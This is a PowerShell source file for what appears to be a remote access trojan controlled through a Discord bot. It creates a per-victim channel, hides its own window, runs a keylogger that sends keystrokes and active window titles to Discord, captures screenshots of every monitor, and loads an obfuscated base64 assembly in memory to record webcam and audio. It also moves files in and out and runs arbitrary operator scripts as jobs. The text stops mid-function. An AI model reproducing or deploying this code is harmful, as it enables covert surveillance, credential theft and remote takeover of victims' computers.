# =============================== GLOBAL VARIABLES ===============================
$global:token = $token
$script:Jobs = @{}
$global:hidewindow = $true
$global:keyloggerstatus = $false
$global:lastMessageAttachments = $null

# =============================== DISCORD API FUNCTIONS ===============================
function Invoke-DiscordAPI {
    param(
        [string]$Url,
        [hashtable]$Headers,
        [string]$Method = "GET",
        [string]$Body = $null,
        [int]$RetryCount = 2,
        [int]$DelayMs = 500
    )
    $attempt = 0
    do {
        try {
            Start-Sleep -Milliseconds ($DelayMs * $attempt)
            $wc = New-Object System.Net.WebClient
            foreach ($key in $Headers.Keys) { $wc.Headers.Add($key, $Headers[$key]) }
            if ($Method -eq "POST" -and $Body) {
                $wc.Headers.Add("Content-Type", "application/json")
                return $wc.UploadString($Url, "POST", $Body)
            } else {
                return $wc.DownloadString($Url)
            }
        }
        catch {
            $attempt++
            if ($_.Exception.Message -match "429|Too Many Requests" -and $attempt -le $RetryCount) { continue }
            throw
        }
    } while ($attempt -le $RetryCount)
}

Function Get_BotUserId {
    $headers = @{ 'Authorization' = "Bot $global:token" }
    $botInfo = Invoke-DiscordAPI -Url "https://discord.com/api/v10/users/@me" -Headers $headers
    return ($botInfo | ConvertFrom-Json).id
}

Function CheckCategoryExists {
    $headers = @{ 'Authorization' = "Bot $global:token" }
    $response = Invoke-DiscordAPI -Url "https://discord.com/api/v10/users/@me/guilds" -Headers $headers
    $guildID = ($response | ConvertFrom-Json)[0].id
    $channels = Invoke-DiscordAPI -Url "https://discord.com/api/v10/guilds/$guildID/channels" -Headers $headers
    $channelList = $channels | ConvertFrom-Json
    
    foreach ($channel in $channelList) {
        if ($channel.type -eq 4 -and $channel.name -eq $env:COMPUTERNAME) {
            $global:CategoryID = $channel.id
            foreach ($subchannel in $channelList) {
                if ($subchannel.type -eq 0 -and $subchannel.name -eq "coral-control" -and $subchannel.parent_id -eq $channel.id) {
                    $global:ChannelID = $subchannel.id
                    return $true
                }
            }
        }
    }
    return $false
}

Function NewChannelCategory {
    $headers = @{ 'Authorization' = "Bot $token" }
    $response = Invoke-DiscordAPI -Url "https://discord.com/api/v10/users/@me/guilds" -Headers $headers
    $guilds = $response | ConvertFrom-Json
    $guildID = $guilds[0].id
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $body = @{ "name" = "$env:COMPUTERNAME"; "type" = 4 } | ConvertTo-Json
    $response = Invoke-DiscordAPI -Url $uri -Headers $headers -Method "POST" -Body $body
    $responseObj = ConvertFrom-Json $response
    $global:CategoryID = $responseObj.id
}

Function NewChannel {
    param([string]$name)
    $headers = @{ 'Authorization' = "Bot $token" }
    $response = Invoke-DiscordAPI -Url "https://discord.com/api/v10/users/@me/guilds" -Headers $headers
    $guilds = $response | ConvertFrom-Json
    $guildID = $guilds[0].id
    $uri = "https://discord.com/api/guilds/$guildID/channels"
    $body = @{ "name" = "$name"; "type" = 0; "parent_id" = $CategoryID } | ConvertTo-Json
    $response = Invoke-DiscordAPI -Url $uri -Headers $headers -Method "POST" -Body $body
    $responseObj = ConvertFrom-Json $response
    $global:ChannelID = $responseObj.id
}

Function PullMsg {
    $headers = @{ 'Authorization' = "Bot $token" }
    try {
        $messages = Invoke-DiscordAPI -Url "https://discord.com/api/v10/channels/$SessionID/messages" -Headers $headers
        $most_recent_message = ($messages | ConvertFrom-Json)[0]
        if ($most_recent_message.author.id -ne $botId) {
            $script:response = $most_recent_message.content
            $global:lastMessageAttachments = $most_recent_message.attachments
            return $most_recent_message.content
        }
    } catch {
        return $null
    }
}

# =============================== MESSAGE FUNCTIONS ===============================
function sendMsg {
    param([string]$Message, [string]$Embed)
    $url = "https://discord.com/api/v10/channels/$SessionID/messages"
    
    if ($Embed) {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Authorization", "Bot $token")
        $wc.Headers.Add("Content-Type", "application/json; charset=utf-8")
        $jsonBody = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
        try { $response = $wc.UploadString($url, "POST", $jsonBody) } catch {}
        $jsonPayload = $null
    }
    
    if ($Message) {
        if ($Message.Length -gt 15000) { Send_AsFile -Content $Message }
        elseif ($Message.Length -gt 1950) { Send_ChunkedMessage -Content $Message }
        else { Send_SingleMessage -Content $Message }
    }
}

function Send_SingleMessage {
    param([string]$Content)
    $url = "https://discord.com/api/v10/channels/$SessionID/messages"
    $headers = @{ 'Authorization' = "Bot $token" }
    $cleanMessage = Clean_MessageContent -InputMessage $Content
    
    if ($cleanMessage.Length -gt 1950) {
        $cleanMessage = $cleanMessage.Substring(0, 1950) + "... (truncated)"
    }
    
    $jsonBody = @{ "content" = $cleanMessage } | ConvertTo-Json -Compress
    
    try {
        $response = Invoke-DiscordAPI -Url $url -Headers $headers -Method "POST" -Body $jsonBody
    } catch {
        try {
            $fallbackMessage = $Content -replace '[^\w\s\.\-\(\)\[\]\{\},:;!@#$%^&*+=<>?/|\\`~]', '?'
            if ($fallbackMessage.Length -gt 1800) {
                $fallbackMessage = $fallbackMessage.Substring(0, 1800) + "... (sanitized)"
            }
            $fallbackJson = @{ "content" = $fallbackMessage } | ConvertTo-Json -Compress
            $response = Invoke-DiscordAPI -Url $url -Headers $headers -Method "POST" -Body $fallbackJson
        } catch {}
    }
}

function Send_ChunkedMessage {
    param([string]$Content)
    $chunks = Split_IntoChunks -Text $Content -ChunkSize 1800
    $totalChunks = $chunks.Count
    
    if ($totalChunks -gt 8) { Send_AsFile -Content $Content; return }
    
    Send_SingleMessage -Content ":page_facing_up: **Large output detected - sending in $totalChunks parts:**"
    
    for ($i = 0; $i -lt $chunks.Count; $i++) {
        $partNumber = $i + 1
        $chunkContent = "**Part $partNumber/$totalChunks :**`n``````$($chunks[$i])``````"
        Send_SingleMessage -Content $chunkContent
        Start-Sleep -Milliseconds 750
    }
    Send_SingleMessage -Content ":white_check_mark: **Output complete ($totalChunks parts sent)**"
}

function Send_AsFile {
    param([string]$Content)
    try {
        $tempDir = $env:TEMP
        $fileName = "coral_output_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
        $tempFile = Join-Path $tempDir $fileName
        $Content | Out-File -FilePath $tempFile -Encoding UTF8
        
        if (Test-Path $tempFile) {
            sendFile -sendfilePath $tempFile
            $fileSize = [math]::Round((Get-Item $tempFile).Length / 1KB, 2)
            Send_SingleMessage -Content ":page_facing_up: **Large output sent as file** (Size: $fileSize KB, Length: $($Content.Length) characters)"
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        } else {
            Send_SingleMessage -Content ":warning: **Failed to create temp file - sending truncated output:**"
            $truncated = $Content.Substring(0, 1800) + "`n`n... (output too large, file creation failed)"
            Send_SingleMessage -Content "``````$truncated``````"
        }
    } catch { Send_ChunkedMessage -Content $Content }
}

function Split_IntoChunks {
    param([string]$Text, [int]$ChunkSize = 1800)
    $chunks = @()
    $currentPos = 0
    $textLength = $Text.Length
    
    while ($currentPos -lt $textLength) {
        $remainingLength = $textLength - $currentPos
        $actualChunkSize = [Math]::Min($ChunkSize, $remainingLength)
        $chunk = $Text.Substring($currentPos, $actualChunkSize)
        
        if ($currentPos + $actualChunkSize -lt $textLength) {
            $lastNewline = $chunk.LastIndexOf("`n")
            if ($lastNewline -gt ($actualChunkSize * 0.6)) {
                $chunk = $chunk.Substring(0, $lastNewline)
                $actualChunkSize = $lastNewline
            } elseif ($chunk.LastIndexOf(" ") -gt ($actualChunkSize * 0.8)) {
                $lastSpace = $chunk.LastIndexOf(" ")
                $chunk = $chunk.Substring(0, $lastSpace)
                $actualChunkSize = $lastSpace
            }
        }
        
        $chunks += $chunk
        $currentPos += $actualChunkSize
        
        if ($currentPos -lt $textLength -and ($Text[$currentPos] -eq "`n" -or $Text[$currentPos] -eq " ")) {
            $currentPos++
        }
    }
    return $chunks
}

function Clean_MessageContent {
    param([string]$InputMessage)
    if ([string]::IsNullOrEmpty($InputMessage)) { return "" }
    
    $cleaned = $InputMessage
    $cleaned = $cleaned -replace "â‚‚", "|" -replace "â€€", "-" -replace "âŒ", "+" -replace "â", "+" -replace "â""", "+" -replace "â˜", "+"
    $cleaned = $cleaned -replace "`0", "" -replace "[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F]", ""
    $cleaned = $cleaned -replace "[^\u0009\u000A\u000D\u0020-\u007E]", "?"
    return $cleaned
}

# =============================== FILE FUNCTIONS ===============================
function sendFile {
    param([string]$sendfilePath)
    if (-not $sendfilePath -or -not (Test-Path $sendfilePath -PathType Leaf)) {
        sendMsg -Message ":x: **File not found:** ``$sendfilePath``"
        return
    }

    $fileInfo = Get-Item $sendfilePath
    $fileName = $fileInfo.Name
    $fileSize = $fileInfo.Length
    $fileSizeMB = [math]::Round($fileSize / 1MB, 2)
    
    if ($fileSize -gt 10MB) {
        sendMsg -Message ":x: **File too large:** ``$fileName`` (${fileSizeMB}MB). Maximum allowed is 10MB."
        return
    }

    $url = "https://discord.com/api/v10/channels/$SessionID/messages"
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Authorization", "Bot $token")
    if (Test-Path $sendfilePath -PathType Leaf) {
        $response = $webClient.UploadFile($url, "POST", $sendfilePath)
    } else {
        sendMsg -Message ":x: **File not found:** ``$sendfilePath``"
    }
}

function downloadFile {
    param([string]$attachmentUrl, [string]$fileName, [string]$downloadPath = $env:TEMP)
    
    if (-not $attachmentUrl -or -not $fileName) {
        sendMsg -Message ":x: **Error:** Missing attachment URL or filename"
        return
    }
    
    try {
        $fullPath = Join-Path $downloadPath $fileName
        
        if (Test-Path $fullPath) {
            $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
            $nameWithoutExt = [System.IO.Path]::GetFileNameWithoutExtension($fileName)
            $extension = [System.IO.Path]::GetExtension($fileName)
            $fileName = "${nameWithoutExt}_${timestamp}${extension}"
            $fullPath = Join-Path $downloadPath $fileName
        }
        
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($attachmentUrl, $fullPath)
        $webClient.Dispose()
        
        if (Test-Path $fullPath) {
            $fileSize = [math]::Round((Get-Item $fullPath).Length / 1KB, 2)
            sendMsg -Message ":white_check_mark: **File downloaded successfully**`n:file_folder: **Path:** ``$fullPath``"
            sendMsg -Message ":information_source: **Size:** ${fileSize} KB"
            #remove $filepath here
            return
        } else {
            sendMsg -Message ":x: **Download failed:** File was not created"
        }
    } catch {
        sendMsg -Message ":x: **Download error:** $($_.Exception.Message)"
    }
}

# =============================== WINDOW FUNCTIONS ===============================
function HideWindow {
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    
    if($hwnd -ne [System.IntPtr]::Zero){
        $Type::ShowWindowAsync($hwnd, 0)
    } else {
        $Host.UI.RawUI.WindowTitle = 'hideme'
        $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
        $hwnd = $Proc.MainWindowHandle
        $Type::ShowWindowAsync($hwnd, 0)
    }
}

# =============================== KEYLOGGER FUNCTIONS ===============================
function keylogger {
    param (
        [int]$intervalSeconds = 30
    )
    
    if (-not $global:keyloggerstatus) {
        sendMsg -Message ":stop_sign: **Keylogger is disabled**"
        return
    }
    
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    using System.Text;
    public class W {
        [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int v);
        [DllImport("user32.dll")] public static extern int GetKeyboardState(byte[] k);
        [DllImport("user32.dll")] public static extern int ToUnicode(uint v, uint s, byte[] k, StringBuilder b, int c, uint f);
        [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    }
"@
    
    $deviceId = $env:COMPUTERNAME
    
    # Use current coral-control channel
    $keylogChannelID = $global:SessionID
    
    sendMsg -Message ":keyboard: **Keylogger started on $deviceId** (Interval: ${intervalSeconds}s)"

    # Key names for special keys
    $keyNames = @{
        8 = "[BACKSPACE]"; 9 = "[TAB]"; 13 = "[ENTER]"; 16 = "[SHIFT]"
        17 = "[CTRL]"; 18 = "[ALT]"; 20 = "[CAPS]"; 27 = "[ESC]"
        32 = " "; 33 = "[PGUP]"; 34 = "[PGDN]"; 35 = "[END]"
        36 = "[HOME]"; 37 = "[LEFT]"; 38 = "[UP]"; 39 = "[RIGHT]"
        40 = "[DOWN]"; 46 = "[DEL]"; 91 = "[WIN]"; 144 = "[NUMLOCK]"; 145 = "[SCROLL]"
    }

    $sessionStart = Get-Date
    
    try {
        while ($global:keyloggerstatus) {
            $keystrokeBuffer = ""
            $windowEvents = @()
            $pressedKeys = @{}
            $startTime = Get-Date
            $currentWindow = ""

            # Data collection loop
            while ((Get-Date) - $startTime -lt [TimeSpan]::FromSeconds($intervalSeconds) -and $global:keyloggerstatus) {
                Start-Sleep -Milliseconds 50
                
                # Get current active window
                try {
                    $hwnd = [W]::GetForegroundWindow()
                    $windowTitle = New-Object System.Text.StringBuilder 256
                    [W]::GetWindowText($hwnd, $windowTitle, 256) | Out-Null
                    $newWindow = $windowTitle.ToString()
                    
                    if ($newWindow -and $newWindow -ne $currentWindow -and $newWindow -notlike "*Discord*") {
                        $currentWindow = $newWindow
                        if ($keystrokeBuffer.Length -gt 0) {
                            $windowEvents += @{
                                Window = $newWindow
                                Position = $keystrokeBuffer.Length
                            }
                        }
                    }
                } catch {}
                
                $keyboardState = New-Object byte[] 256
                [W]::GetKeyboardState($keyboardState) | Out-Null

                # Capture keystrokes
                for ($vk = 8; $vk -le 255; $vk++) {
                    $isDown = ([W]::GetAsyncKeyState($vk) -band 0x8000) -ne 0
                    if ($isDown -and -not $pressedKeys.ContainsKey($vk)) {
                        $pressedKeys[$vk] = $true
                        if ($keyNames.ContainsKey($vk)) {
                            $keystrokeBuffer += $keyNames[$vk]
                        } else {
                            $sb = New-Object System.Text.StringBuilder 2
                            $result = [W]::ToUnicode([uint32]$vk, 0, $keyboardState, $sb, $sb.Capacity, 0)
                            if ($result -gt 0) { 
                                $char = $sb.ToString()
                                if ($char -match '[a-zA-Z0-9\s\.\,\;\:\!\?\-_\(\)\[\]\{\}\\\/\@\#\$\%\^\&\*\+\=\<\>\|\`\~]') {
                                    $keystrokeBuffer += $char
                                }
                            }
                        }
                    } elseif (-not $isDown -and $pressedKeys.ContainsKey($vk)) {
                        $pressedKeys.Remove($vk)
                    }
                }
            }

            # Send keylog data to coral-control channel
            if ($keystrokeBuffer.Length -gt 0) {
                $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                $logContent = ":keyboard: **[$timestamp] - $deviceId KEYLOG**`n"
                
                if ($windowEvents.Count -gt 0) {
                    $lastPos = 0
                    foreach ($event in $windowEvents) {
                        if ($lastPos -lt $event.Position) {
                            $segment = $keystrokeBuffer.Substring($lastPos, $event.Position - $lastPos)
                            if ($segment.Trim().Length -gt 0) {
                                $logContent += "``$segment```n"
                            }
                        }
                        $logContent += "**[Window: $($event.Window)]**`n"
                        $lastPos = $event.Position
                    }
                    # Add remaining keystrokes
                    if ($lastPos -lt $keystrokeBuffer.Length) {
                        $remaining = $keystrokeBuffer.Substring($lastPos)
                        if ($remaining.Trim().Length -gt 0) {
                            $logContent += "``$remaining```n"
                        }
                    }
                } else {
                    if ($currentWindow -and $currentWindow -notlike "*Discord*") {
                        $logContent += "**[Window: $currentWindow]**`n"
                    }
                    $logContent += "``$keystrokeBuffer```n"
                }
                
                try {
                    sendMsg -Message $logContent
                } catch {}
            }

            Remove-Variable keystrokeBuffer, windowEvents, pressedKeys, startTime -ErrorAction SilentlyContinue
            [System.GC]::Collect()
        }
    } catch {
        sendMsg -Message ":x: **Keylogger error:** $($_.Exception.Message)"
    } finally {
        sendMsg -Message ":stop_sign: **Keylogger stopped on $deviceId**"
    }
}

function Start_Keylogger {
    param([int]$intervalSeconds = 30)
    
    if ($global:keyloggerstatus) {
        sendMsg -Message ":warning: **Keylogger is already running**"
        return
    }
    
    $global:keyloggerstatus = $true
    
    try {
        sendMsg -Message ":keyboard: **Starting keylogger...** (Interval: ${intervalSeconds}s)"
        
        $keylogJob = Start-Job -ScriptBlock {
            param($token, $SessionID, $CategoryID, $intervalSeconds)
            
            $global:token = $token
            $global:SessionID = $SessionID
            $global:CategoryID = $CategoryID
            $global:keyloggerstatus = $true
            
            # Import functions
            ${function:sendMsg} = ${using:function:sendMsg}
            ${function:Send_SingleMessage} = ${using:function:Send_SingleMessage}
            ${function:Send_ChunkedMessage} = ${using:function:Send_ChunkedMessage}
            ${function:Send_AsFile} = ${using:function:Send_AsFile}
            ${function:Split_IntoChunks} = ${using:function:Split_IntoChunks}
            ${function:Clean_MessageContent} = ${using:function:Clean_MessageContent}
            ${function:sendFile} = ${using:function:sendFile}
            ${function:Invoke-DiscordAPI} = ${using:function:Invoke-DiscordAPI}
            ${function:keylogger} = ${using:function:keylogger}
            
            keylogger -intervalSeconds $intervalSeconds
            
        } -ArgumentList $global:token, $global:SessionID, $global:CategoryID, $intervalSeconds
        
        $script:Jobs["KEYLOGGER"] = $keylogJob
        sendMsg -Message ":keyboard: **Keylogger started** (Job ID: $($keylogJob.Id)) - Data will appear in this channel"
        
    } catch {
        $global:keyloggerstatus = $false
        sendMsg -Message ":x: **Failed to start keylogger:** $($_.Exception.Message)"
    }
}

function Stop_Keylogger {
    $global:keyloggerstatus = $false
    
    if ($script:Jobs.ContainsKey("KEYLOGGER")) {
        $job = $script:Jobs["KEYLOGGER"]
        try {
            # Force stop the job immediately
            Stop-Job -Job $job -ErrorAction SilentlyContinue

            # Wait a moment for it to stop
            Start-Sleep -Milliseconds 500
            
            # Remove the job
            Remove-Job -Job $job -ErrorAction SilentlyContinue
            
            # Remove from our jobs tracking
            $script:Jobs.Remove("KEYLOGGER")
            
            sendMsg -Message ":stop_sign: **Keylogger stopped successfully**"
        } catch {
            # If normal stop fails, try more aggressive approach
            try {
                $job | Stop-Job -ErrorAction SilentlyContinue
                $job | Remove-Job -ErrorAction SilentlyContinue
                $script:Jobs.Remove("KEYLOGGER")
                sendMsg -Message ":stop_sign: **Keylogger force stopped**"
            } catch {
                sendMsg -Message ":warning: **Error stopping keylogger:** $($_.Exception.Message)"
            }
        }
    } else {
        sendMsg -Message ":information_source: **Keylogger is not running**"
    }
}

function Get_KeyloggerStatus {
    if ($global:keyloggerstatus -and $script:Jobs.ContainsKey("KEYLOGGER")) {
        $job = $script:Jobs["KEYLOGGER"]
        sendMsg -Message ":gear: **Keylogger Status:** Running (Job State: $($job.State)) - Logging to this channel"
    } else {
        sendMsg -Message ":gear: **Keylogger Status:** Stopped"
    }
}


# =============================== SS FUNCTIONS ===============================
function screenshot_all {
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $screens = [System.Windows.Forms.Screen]::AllScreens
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        
        if ($screens.Count -gt 1) {
            sendMsg -Message ":camera: **Capturing $($screens.Count) monitors...**"
            
            for ($i = 0; $i -lt $screens.Count; $i++) {
                $screen = $screens[$i]
                $tempFile = "$env:temp\screenshot_monitor$($i+1)_$timestamp.png"
                
                if ($screen.Primary) {
                    $width = Get-CimInstance Win32_VideoController | Select-Object -First 1
                    $width = [int]($width.CurrentHorizontalResolution)
                    $height = Get-CimInstance Win32_VideoController | Select-Object -First 1
                    $height = [int]($height.CurrentVerticalResolution)
                    $bitmap = New-Object System.Drawing.Bitmap $width, $height
                    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
                    $graphic.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
                } else {
                    $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
                    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
                    $graphic.CopyFromScreen($screen.Bounds.X, $screen.Bounds.Y, 0, 0, $screen.Bounds.Size)
                }
                $bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)
                $graphic.Dispose()
                $bitmap.Dispose()
                
                if (Test-Path $tempFile) {
                    sendFile -sendfilePath $tempFile
                    Start-Sleep -Seconds 1
                    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
                }
            }
        } else {
            $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
            $tempFile = "$env:temp\screenshot_$timestamp.png"
            
            $width = Get-CimInstance Win32_VideoController | Select-Object -First 1
            $width = [int]($width.CurrentHorizontalResolution)
            $height = Get-CimInstance Win32_VideoController | Select-Object -First 1
            $height = [int]($height.CurrentVerticalResolution)
            
            $bitmap = New-Object System.Drawing.Bitmap $width, $height
            $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
            $graphic.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)

            $bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)
            $graphic.Dispose()
            $bitmap.Dispose()
            sendFile -sendfilePath $tempFile
            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        }
    } catch {
        sendMsg -Message ":x: **Multi-monitor screenshot error:** $($_.Exception.Message)"
    }
}

# =============================== WEBCAM FUNCTIONS ===============================
function Webcam {
    param(
        [int]$durationSeconds = 1,
        [string]$quality = "low"
    )
    
    $encMergedAssembly = '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'

    $tempDir = $env:TEMP
    $fileName = "coral_webcam_$(Get-Date -Format 'yyyyMMdd_HHmmss').avi"
    $OutPath = Join-Path $tempDir $fileName  
    $RecordTime = $durationSeconds
    
    $bytes = [Convert]::FromBase64String($encMergedAssembly)
    try {
        [System.Reflection.Assembly]::Load($bytes) | Out-Null
    } catch {
        sendMsg -Message ":x: **Error loading webcam assembly:** $($_.Exception.Message)"
        return
    }
    
    try {
        $filters = New-Object DirectX.Capture.Filters 
    } catch {
        sendMsg -Message ":x: **Error creating webcam filters:** $($_.Exception.Message)"
        return
    }
    
    if (($null -ne $filters.VideoInputDevices) -and ($filters.AudioInputDevices)) {
        $VideoInput = $filters.VideoInputDevices[0]
        $AudioInput = $filters.AudioInputDevices[0]
        $VideoCapture = New-Object DirectX.Capture.Capture -ArgumentList $VideoInput,$AudioInput
        $VideoCapture.Filename = $OutPath
        $Compression = $filters.VideoCompressors[0]
        if ($null -ne $Compression) {
            $VideoCapture.VideoCompressor = $Compression
        }
        
        try{
            $VideoCapture.Start()
            sendMsg -Message ":video_camera: **Starting webcam recording** (Duration: ${RecordTime}s)"
        } catch {
            sendMsg -Message ":x: **Unable to start webcam capture**"
            $VideoCapture.Stop()
            return
        }
        Start-Sleep -seconds $RecordTime
        $VideoCapture.stop()
        
        if (Test-Path $OutPath) {
            sendMsg -Message ":video_camera: **Webcam recording completed** (Duration: ${RecordTime}s)"
            sendFile -sendfilePath $OutPath
            Start-Sleep -Seconds 2
            Remove-Item $OutPath -Force -ErrorAction SilentlyContinue
        } else {
            sendMsg -Message ":x: **Failed to create webcam recording file**"
        }
    } else {
        sendMsg -Message ":x: **No webcam or audio devices found**"    
    }
}

# =============================== JOB MANAGEMENT FUNCTIONS ===============================
function Start_AgentJob {
    param($ScriptString)
    $RandName = -join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 6)
    $job = Start-Job -ScriptBlock ([ScriptBlock]::Create($ScriptString))
    $script:Jobs[$RandName] = $job
    sendMsg -Message "Job Started: ``$RandName`` | ID: $($job.Id)"
    return $RandName
}

function Get_AgentJobCompleted {
    param($JobName)
